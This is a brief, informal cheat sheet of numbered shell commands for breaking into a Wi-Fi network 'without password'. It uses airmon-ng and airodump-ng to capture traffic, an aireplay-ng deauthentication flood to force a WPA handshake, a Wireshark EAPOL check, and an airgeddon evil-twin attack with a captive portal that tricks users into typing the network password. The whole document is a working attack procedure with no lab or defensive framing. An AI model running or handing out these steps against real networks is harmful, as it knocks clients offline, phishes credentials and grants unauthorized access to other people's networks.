*NOTE: sometimes wlan0 is actually wlp8s0(wlan0->wlp8s0mon too)*

*catch handshake(connect to the wifi without password):*

1)sudo airmon-ng start wlan0      *puts device into networks monitor mode*
2)sudo airmon-ng check kill       
3)sudo airodump-ng wlan0mon       *lists all networks
4)sudo airodump-ng --bssid <MAC addr> -c <channel> --write capture wlan0mon   *leave this terminal open
*open new terminal
5)sudo aireplay-ng --deauth 10 -a <MAC addr> -c <station> wlan0mon
*find file of the captured handshakes(directory i which the previous command was ran)
*check if the handshakes are successful - in wireshark filter write "eapol" - should be 4 handshakes

6)*open aireggedon

7)monitor mode -> evil twin menu(7) -> attack with captive portal(9) -> *enter, enter* ->find target network ->deauth/disassoc(1) -> *y, y,* ->specify path to captured handshake(5th step)
